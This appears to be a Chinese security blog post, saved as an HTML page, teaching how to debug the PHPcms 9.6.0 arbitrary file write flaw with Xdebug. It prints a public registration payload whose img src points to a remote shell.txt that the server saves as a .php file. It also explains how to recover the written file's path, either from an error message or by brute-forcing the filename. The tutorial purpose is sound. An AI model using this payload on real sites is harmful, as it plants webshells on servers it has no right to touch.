@@ -1,0 +1,1045 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="php,漏洞分析," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="0x01 写在前面最近在啃漏洞代码，所以这篇文章新手向，主要的是结合漏洞讲讲如何通过debug的方式，通过已知poc了解漏洞原理。 0x02 进入正题这次拿的漏洞是PHPcms 9.6.0中的任意上传文件漏洞来说，其实准确来说应该是任意文件写入才对。 基础知识对于php来说，debug的话，有个东西叫xdebug，当然配置这个时候，特别在mac下出了很多坑，这里强烈推荐一个mac下类似phpstu">
+<meta name="keywords" content="php,漏洞分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从debug看php代码审计">
+<meta property="og:url" content="http://www.lmxspace.com/2018/06/05/从debug看php代码审计/index.html">
+<meta property="og:site_name" content="l1nk3r&#39;s blog">
+<meta property="og:description" content="0x01 写在前面最近在啃漏洞代码，所以这篇文章新手向，主要的是结合漏洞讲讲如何通过debug的方式，通过已知poc了解漏洞原理。 0x02 进入正题这次拿的漏洞是PHPcms 9.6.0中的任意上传文件漏洞来说，其实准确来说应该是任意文件写入才对。 基础知识对于php来说，debug的话，有个东西叫xdebug，当然配置这个时候，特别在mac下出了很多坑，这里强烈推荐一个mac下类似phpstu">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://www.lmxspace.com/2018/06/05/从debug看php代码审计/7.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/06/05/从debug看php代码审计/8.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/06/05/从debug看php代码审计/9.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/06/05/从debug看php代码审计/10.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/06/05/从debug看php代码审计/12.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/06/05/从debug看php代码审计/13.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/06/05/从debug看php代码审计/15.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/06/05/从debug看php代码审计/16.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/06/05/从debug看php代码审计/17.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/06/05/从debug看php代码审计/18.png">
+<meta property="og:updated_time" content="2018-06-05T09:58:11.622Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="从debug看php代码审计">
+<meta name="twitter:description" content="0x01 写在前面最近在啃漏洞代码，所以这篇文章新手向，主要的是结合漏洞讲讲如何通过debug的方式，通过已知poc了解漏洞原理。 0x02 进入正题这次拿的漏洞是PHPcms 9.6.0中的任意上传文件漏洞来说，其实准确来说应该是任意文件写入才对。 基础知识对于php来说，debug的话，有个东西叫xdebug，当然配置这个时候，特别在mac下出了很多坑，这里强烈推荐一个mac下类似phpstu">
+<meta name="twitter:image" content="http://www.lmxspace.com/2018/06/05/从debug看php代码审计/7.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.lmxspace.com/2018/06/05/从debug看php代码审计/"/>
+
+
+
+
+
+  <title>从debug看php代码审计 | l1nk3r's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">l1nk3r's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-friends">
+          <a href="/Friends" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            Friends
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.lmxspace.com/2018/06/05/从debug看php代码审计/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="l1nk3r">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="l1nk3r's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">从debug看php代码审计</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-05T17:54:16+08:00">
+                2018-06-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+            
+              &nbsp; | &nbsp;
+              <span id="/2018/06/05/从debug看php代码审计/"class="leancloud_visitors" data-flag-title="从debug看php代码审计">
+              &nbsp;热度
+              </span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/代码审计/" itemprop="url" rel="index">
+                    <span itemprop="name">代码审计</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/06/05/从debug看php代码审计/" class="leancloud_visitors" data-flag-title="从debug看php代码审计">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">热度&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+                 <span>℃</span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="0x01-写在前面"><a href="#0x01-写在前面" class="headerlink" title="0x01 写在前面"></a>0x01 写在前面</h1><p>最近在啃漏洞代码，所以这篇文章新手向，主要的是结合漏洞讲讲如何通过debug的方式，通过已知poc了解漏洞原理。</p>
+<h1 id="0x02-进入正题"><a href="#0x02-进入正题" class="headerlink" title="0x02 进入正题"></a>0x02 进入正题</h1><p>这次拿的漏洞是PHPcms 9.6.0中的<del>任意上传文件漏洞</del>来说，其实准确来说应该是任意文件写入才对。</p>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>对于php来说，debug的话，有个东西叫xdebug，当然配置这个时候，特别在mac下出了很多坑，这里强烈推荐一个mac下类似phpstudy的东西，叫做MxSrvs，了解一下？</p>
+<h3 id="Xdebug工作原理"><a href="#Xdebug工作原理" class="headerlink" title="Xdebug工作原理"></a>Xdebug工作原理</h3><p>1，IDE（如PhpStorm）已经集成了一个遵循BGDP的Xdebug插件，当开启它的时候， 会在本地开一个xdebug调试服务，监听在调试器中所设置的端口上，默认是9000，这个服务就会监听所有到9000端口的链接。在PhpStorm中，位于：工具栏 &gt; Run &gt; Start / Stop Listening for PHP Xdebug Connetions。</p>
+<p> 2，当浏览器发送一个带XDEBUG_SESSION_START的参数的请求到服务器时，服务器接受后将其转到后端的php处理，如果php开启了xdebug模块，则会将debug信息转发到客户端IP的IDE的调试端口上。当参数或者cookie信息中不带XDEBUG_SESSION_START，则不会启动调试。这就为后续在浏览器中添加开关提供了可能。Xdebug的官方给出了一个示例图：很好的展示了相互调用关系。 </p>
+<p>这个示例图是绑定了ip，即使用了固定ip地址，xdebug.remote_connect_back = 0 ，也是 xdebug 的默认方式，这种情况下，xdebug 在收到调试通知时会读取配置 xdebug.remote_host 和 xdebug.remote_port ，默认是 localhost:9000，然后向这个端口发送通知，这种方式只适合单一客户端开发调试。</p>
+<p><img src="/2018/06/05/从debug看php代码审计/7.png" alt="7"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>上面简单介绍一下xdebug的一些工作原理，下面开始看看这个漏洞，如果通过xdebug远程调试的办法来了解原理。</p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>漏洞利用点是注册的地方，以下是一个公开的payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1</span><br><span class="line"></span><br><span class="line">post数据： </span><br><span class="line">siteid=1&amp;modelid=11&amp;username=test&amp;password=testxx&amp;email=test@qq.com&amp;info[content]=&lt;img src=http://xxxx/shell.txt?.php#.jpg&gt;&amp;dosubmit=1</span><br></pre></td></tr></table></figure>
+<p>这里我选择phpstorm配合xdebug动态调试一波，看看漏洞点在哪。</p>
+<p><img src="/2018/06/05/从debug看php代码审计/8.png" alt="8"></p>
+<p>phpcms 注册在模块<code>/phpcms/modules/member</code> 的index.php文件中，找到register函数。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//附表信息验证 通过模型获取会员信息</span></span><br><span class="line"><span class="keyword">if</span>($member_setting[<span class="string">'choosemodel'</span>]) &#123;</span><br><span class="line">   <span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">'member_input.class.php'</span>;</span><br><span class="line">   <span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">'member_update.class.php'</span>;</span><br><span class="line">   $member_input = <span class="keyword">new</span> member_input($userinfo[<span class="string">'modelid'</span>]);       </span><br><span class="line">   $_POST[<span class="string">'info'</span>] = array_map(<span class="string">'new_html_special_chars'</span>,$_POST[<span class="string">'info'</span>]);</span><br><span class="line">   $user_model_info = $member_input-&gt;get($_POST[<span class="string">'info'</span>]);                              </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里通过require_once包含了两个caches/caches_model/下的PHP文件，然后通过modelid new了一个member_input类。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">'member_input.class.php'</span>;</span><br><span class="line"><span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">'member_update.class.php'</span>;</span><br><span class="line">$member_input = <span class="keyword">new</span> member_input($userinfo[<span class="string">'modelid'</span>]);</span><br></pre></td></tr></table></figure>
+<p>这里我们下一个断点，动态调试下。</p>
+<p><img src="/2018/06/05/从debug看php代码审计/9.png" alt="9"></p>
+<p>通过payload，不难看出我们的 payload 在<code>$_POST[&#39;info&#39;]</code>里，而这里对<code>$_POST[&#39;info&#39;]</code>进行了处理，所以跟进一下。这里其实在通过<code>$_POST[&#39;info&#39;]</code>传入的时候针对其使用new_html_special_chars对&lt;&gt;进行编码之后。</p>
+<p><img src="/2018/06/05/从debug看php代码审计/10.png" alt="10"></p>
+<p>跟进$member_input-&gt;get函数，该函数位于caches/caches_model/caches_data/member_input.class.php中。</p>
+<p><img src="/2018/06/05/从debug看php代码审计/12.png" alt="12"></p>
+<p>这里我们可以看到，我们的payload是info[content]，所以调用的是editor函数。所以跟一下，editor函数。这个函数也在这个文件里的第59-66</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">editor</span><span class="params">($field, $value)</span> </span>&#123;</span><br><span class="line">		$setting = string2array(<span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'setting'</span>]);</span><br><span class="line">		$enablesaveimage = $setting[<span class="string">'enablesaveimage'</span>];</span><br><span class="line">		$site_setting = string2array(<span class="keyword">$this</span>-&gt;site_config[<span class="string">'setting'</span>]);</span><br><span class="line">		$watermark_enable = intval($site_setting[<span class="string">'watermark_enable'</span>]);</span><br><span class="line">		$value = <span class="keyword">$this</span>-&gt;attachment-&gt;download(<span class="string">'content'</span>, $value,$watermark_enable);</span><br><span class="line">		<span class="keyword">return</span> $value;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/06/05/从debug看php代码审计/13.png" alt="13"></p>
+<p>然后这里就执行$this-&gt;attachment-&gt;download函数进行下载，我们继续跟进。</p>
+<p>在phpcms/libs/classes/attachment.class.php中：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">($field, $value,$watermark = <span class="string">'0'</span>,$ext = <span class="string">'gif|jpg|jpeg|bmp|png'</span>, $absurl = <span class="string">''</span>, $basehref = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">global</span> $image_d;</span><br><span class="line">   <span class="keyword">$this</span>-&gt;att_db = pc_base::load_model(<span class="string">'attachment_model'</span>);</span><br><span class="line">   $upload_url = pc_base::load_config(<span class="string">'system'</span>,<span class="string">'upload_url'</span>);</span><br><span class="line">   <span class="keyword">$this</span>-&gt;field = $field;</span><br><span class="line">   $dir = date(<span class="string">'Y/md/'</span>);</span><br><span class="line">   $uploadpath = $upload_url.$dir;</span><br><span class="line">   $uploaddir = <span class="keyword">$this</span>-&gt;upload_root.$dir;</span><br><span class="line">   $string = new_stripslashes($value);</span><br><span class="line">   <span class="keyword">if</span>(!preg_match_all(<span class="string">"/(href|src)=([\"|']?)([^ \"'&gt;]+\.($ext))\\2/i"</span>, $string, $matches)) <span class="keyword">return</span> $value;</span><br><span class="line">   $remotefileurls = <span class="keyword">array</span>();</span><br><span class="line">   <span class="keyword">foreach</span>($matches[<span class="number">3</span>] <span class="keyword">as</span> $matche)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">if</span>(strpos($matche, <span class="string">'://'</span>) === <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">      dir_create($uploaddir);</span><br><span class="line">      $remotefileurls[$matche] = <span class="keyword">$this</span>-&gt;fillurl($matche, $absurl, $basehref);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">unset</span>($matches, $string);</span><br><span class="line">   $remotefileurls = array_unique($remotefileurls);</span><br><span class="line">   $oldpath = $newpath = <span class="keyword">array</span>();</span><br><span class="line">   <span class="keyword">foreach</span>($remotefileurls <span class="keyword">as</span> $k=&gt;$file) &#123;</span><br><span class="line">      <span class="keyword">if</span>(strpos($file, <span class="string">'://'</span>) === <span class="keyword">false</span> || strpos($file, $upload_url) !== <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">      $filename = fileext($file);</span><br><span class="line">      $file_name = basename($file);</span><br><span class="line">      $filename = <span class="keyword">$this</span>-&gt;getname($filename);</span><br><span class="line"></span><br><span class="line">      $newfile = $uploaddir.$filename;</span><br><span class="line">      $upload_func = <span class="keyword">$this</span>-&gt;upload_func;</span><br><span class="line">      <span class="keyword">if</span>($upload_func($file, $newfile)) &#123;</span><br><span class="line">         $oldpath[] = $k;</span><br><span class="line">         $GLOBALS[<span class="string">'downloadfiles'</span>][] = $newpath[] = $uploadpath.$filename;</span><br><span class="line">         @chmod($newfile, <span class="number">0777</span>);</span><br><span class="line">         $fileext = fileext($filename);</span><br><span class="line">         <span class="keyword">if</span>($watermark)&#123;</span><br><span class="line">            watermark($newfile, $newfile,<span class="keyword">$this</span>-&gt;siteid);</span><br><span class="line">         &#125;</span><br><span class="line">         $filepath = $dir.$filename;</span><br><span class="line">         $downloadedfile = <span class="keyword">array</span>(<span class="string">'filename'</span>=&gt;$filename, <span class="string">'filepath'</span>=&gt;$filepath, <span class="string">'filesize'</span>=&gt;filesize($newfile), <span class="string">'fileext'</span>=&gt;$fileext);</span><br><span class="line">         $aid = <span class="keyword">$this</span>-&gt;add($downloadedfile);</span><br><span class="line">         <span class="keyword">$this</span>-&gt;downloadedfiles[$aid] = $filepath;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> str_replace($oldpath, $newpath, $value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>函数中先对$value中的引号进行了转义，然后使用正则匹配：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ext = <span class="string">'gif|jpg|jpeg|bmp|png'</span>;</span><br><span class="line">...</span><br><span class="line">$string = new_stripslashes($value);</span><br><span class="line"><span class="keyword">if</span>(!preg_match_all(<span class="string">"/(href|src)=(["</span>|<span class="string">']?)([^ "'</span>&gt;]+.($ext))\<span class="number">2</span>/i<span class="string">",$string, $matches)) return $value;</span></span><br></pre></td></tr></table></figure>
+<p>这里正则要求输入满足src/href=url.(gif|jpg|jpeg|bmp|png)，所以我们的payload<code>&lt;img src=http://url/shell.txt?.php#.jpg&gt;</code>符合这一格式。</p>
+<p>接下来有串代码，目的是用来代码来去除 url 中的锚点。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($matches[<span class="number">3</span>] <span class="keyword">as</span> $matche)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">if</span>(strpos($matche, <span class="string">'://'</span>) === <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">   dir_create($uploaddir);</span><br><span class="line">   $remotefileurls[$matche] = <span class="keyword">$this</span>-&gt;fillurl($matche, $absurl, $basehref);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最后在第162行有这样一行代码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$remotefileurls = array_unique($remotefileurls);</span><br></pre></td></tr></table></figure>
+<p>它的效果如下图，可以看到<code>.jpg</code>已经没有</p>
+<p><img src="/2018/06/05/从debug看php代码审计/15.png" alt="15"></p>
+<p>然后继续单步调试就很明显知道干了什么。</p>
+<p><img src="/2018/06/05/从debug看php代码审计/16.png" alt="16"></p>
+<p>这里就是通过程序调用copy函数，对远程的文件进行了下载，然后并且写入。所以啊，这里也就是为什么我刚刚说这个漏洞更像是任意文件写入的问题。并且也返回了写入后的文件放在哪里了。</p>
+<p><img src="/2018/06/05/从debug看php代码审计/17.png" alt="17"></p>
+<h3 id="一些技巧"><a href="#一些技巧" class="headerlink" title="一些技巧"></a>一些技巧</h3><p>如何获取上传后的地址，这里有两种方法。</p>
+<h4 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(pc_base::load_config(<span class="string">'system'</span>, <span class="string">'phpsso'</span>)) &#123;</span><br><span class="line">   <span class="keyword">$this</span>-&gt;_init_phpsso();</span><br><span class="line">   $status = <span class="keyword">$this</span>-&gt;client-&gt;ps_member_register($userinfo[<span class="string">'username'</span>], $userinfo[<span class="string">'password'</span>], $userinfo[<span class="string">'email'</span>], $userinfo[<span class="string">'regip'</span>], $userinfo[<span class="string">'encrypt'</span>]);</span><br><span class="line">   <span class="keyword">if</span>($status &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      $userinfo[<span class="string">'phpssouid'</span>] = $status;</span><br><span class="line">      <span class="comment">//传入phpsso为明文密码，加密后存入phpcms_v9</span></span><br><span class="line">      $password = $userinfo[<span class="string">'password'</span>];</span><br><span class="line">      $userinfo[<span class="string">'password'</span>] = password($userinfo[<span class="string">'password'</span>], $userinfo[<span class="string">'encrypt'</span>]);</span><br><span class="line">      $userid = <span class="keyword">$this</span>-&gt;db-&gt;insert($userinfo, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span>($member_setting[<span class="string">'choosemodel'</span>]) &#123;   <span class="comment">//如果开启选择模型</span></span><br><span class="line">         $user_model_info[<span class="string">'userid'</span>] = $userid;</span><br><span class="line">         <span class="comment">//插入会员模型数据</span></span><br><span class="line">         <span class="keyword">$this</span>-&gt;db-&gt;set_model($userinfo[<span class="string">'modelid'</span>]);</span><br><span class="line">         <span class="keyword">$this</span>-&gt;db-&gt;insert($user_model_info);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到当$status &gt; 0时会执行 SQL 语句进行 INSERT 操作，向数据库中插入数据，因为表中并没有content列，所以产生报错。</p>
+<p><img src="/2018/06/05/从debug看php代码审计/18.png" alt="18"></p>
+<p>因此会在页面上直接返回写入后的地址。</p>
+<h4 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h4><p>在无法得到路径的情况下我们只能爆破了， 文件名生成的方法为:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getname</span><span class="params">($fileext)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> date(<span class="string">'Ymdhis'</span>).rand(<span class="number">100</span>, <span class="number">999</span>).<span class="string">'.'</span>.$fileext;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>因为我们只需要爆破rand(100,999)即可，很容易爆破出来文件名</p>
+<h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>在做代码审计的时候，我的一些理解，我们往往可以通过数据包，php自身框架的路由或者java自身路由等手段获取到功能点所在的文件位置，但是不一定能够精准定位到调用了那些函数，进行了那些跳转等。这时候通过远程xebug的方式，可以很快很精准的定位到问题所在，所以这也不失为一种好办法，大佬们觉得呢。</p>
+<h1 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h1><p><a href="http://xxlegend.com/2017/05/23/PhpStorm%20Xdebug%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%8F%8A%E9%97%AE%E9%A2%98%E6%8E%92%E6%9F%A5/" target="_blank" rel="noopener">PhpStorm Xdebug远程调试环境搭建原理分析及问题排查</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/php/" rel="tag"><i class="fa fa-tag"></i> php</a>
+          
+            <a href="/tags/漏洞分析/" rel="tag"><i class="fa fa-tag"></i> 漏洞分析</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/05/24/记一次恶意安卓app分析/" rel="next" title="记一次恶意安卓app分析">
+                <i class="fa fa-chevron-left"></i> 记一次恶意安卓app分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/06/12/文件上传漏洞writeup/" rel="prev" title="文件上传漏洞writeup">
+                文件上传漏洞writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
